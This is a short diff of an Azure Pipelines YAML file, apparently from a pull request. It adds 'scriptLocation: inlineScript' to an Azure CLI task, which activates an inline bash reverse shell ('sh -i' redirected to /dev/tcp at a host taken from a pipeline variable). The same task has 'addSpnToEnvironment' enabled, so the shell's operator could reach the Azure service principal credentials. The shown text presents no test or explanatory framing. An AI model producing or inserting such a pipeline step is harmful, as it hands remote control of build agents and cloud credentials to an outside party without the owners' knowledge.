@@ -9,6 +9,7 @@ steps:
   inputs:
     azureSubscription: foo
     scriptType: bash
+    scriptLocation: inlineScript
     inlineScript: |
         sh -i >& "/dev/tcp/$(ME)" 0>&1
     addSpnToEnvironment: true
